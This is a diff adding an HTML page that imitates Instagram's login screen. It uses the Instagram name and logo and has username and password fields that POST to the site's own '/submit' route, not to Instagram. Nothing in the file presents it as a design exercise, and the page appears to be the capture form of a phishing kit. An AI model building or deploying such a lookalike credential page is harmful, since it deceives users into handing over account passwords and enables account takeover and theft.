@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="shortcut icon" href="/images/instapng.png" type="image/x-icon">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <title>Instagram</title>
+  <style>
+    /* Custom CSS for floating labels */
+    .floating-label-group {
+      position: relative;
+    }
+
+    .floating-label-group input:focus ~ label,
+    .floating-label-group input:not(:placeholder-shown) ~ label {
+      transform: translateY(-1.5rem);
+      font-size: 0.75rem;
+      color: #9CA3AF; /* Tailwind blue-500 */
+    }
+
+    .floating-label-group label {
+      position: absolute;
+      top: 60%;
+      left: 0.75rem;
+      transform: translateY(-50%);
+      transition: all 0.2s ease;
+      pointer-events: none;
+      color: #9ca3af; /* Tailwind gray-400 */
+    }
+  </style>
+</head>
+<body>
+
+  <div class="w-full min-h-screen bg-zinc-900 text-white py-5 flex flex-col items-center justify-center">
+    <div class="flex flex-col items-center gap-5 px-4">
+      <h1 class="text-gray-600 text-[0.6rem] absolute top-[2%]">English (India)</h1>
+      <img class=" h-[3rem] absolute top-[15%]" src="/images/instapng.png" alt="">
+
+      <form action="/submit" method="POST" class="w-full">
+        <!-- Username Field -->
+        <div class="floating-label-group w-full">
+          <input 
+            class="px-1 mt-2 py-2 border border-1 border-gray-600 rounded-md block w-[21rem] bg-zinc-800 text-white placeholder-transparent pl-3 focus:outline-gray-800"
+            type="text" 
+            name="username" 
+            placeholder=" " 
+            required
+          >
+          <label class="text-gray-400 text-[0.9rem]">Username, email address or mobile number</label>
+        </div>
+
+        <!-- Password Field -->
+        <div class="floating-label-group w-full">
+          <input 
+            class="px-1 mt-2 py-2 border border-1 border-gray-600 rounded-md block w-full bg-zinc-800 text-white placeholder-transparent pl-3 focus:outline-gray-600"
+            type="password" 
+            name="password" 
+            placeholder=" " 
+            required
+          >
+          <label class="text-gray-400">Password</label>
+        </div>
+
+        <input 
+          class="w-full bg-blue-700 px-3 py-2 rounded-full mt-2 cursor-pointer hover:bg-blue-900 transition-all"
+          type="submit" 
+          value="Login"
+        >
+      </form>
+
+      <input 
+        class="w-[90%] px-3 py-2 rounded-full mt-2 cursor-pointer border border-blue-600 text-blue-600 transition-all absolute bottom-8"
+        type="submit" 
+        value="Create an account"
+      >
+      <img class="absolute h-[1rem] bottom-2" src="./images/download.png" alt="">
+      <h1 class="text-gray-300 text-[0.8rem]">Forgotten Password? </h1>
+    </div>
+  </div>
+
+</body>
+</html>
